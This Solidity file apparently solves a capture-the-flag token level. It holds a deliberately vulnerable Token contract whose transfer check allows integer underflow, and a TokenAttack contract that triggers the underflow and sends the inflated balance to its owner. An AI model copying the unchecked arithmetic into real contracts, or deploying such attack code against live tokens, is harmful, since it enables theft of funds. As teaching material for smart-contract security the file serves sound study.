// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

contract TokenAttack {

    address owner;
    Token toAttack;

    constructor(address _levelInstance) public {
        toAttack = Token(_levelInstance);
        owner = msg.sender;
    }

    function attack(address _to, uint _amount) public {
        //cause underflow in Token contract
        toAttack.transfer(_to, _amount);
    }

    //collect all tokens from attack contract
    function collectTokens() public {
        require(msg.sender == owner);

        uint maxBalance = toAttack.balanceOf(address(this));
        toAttack.transfer(owner,maxBalance);
    }
}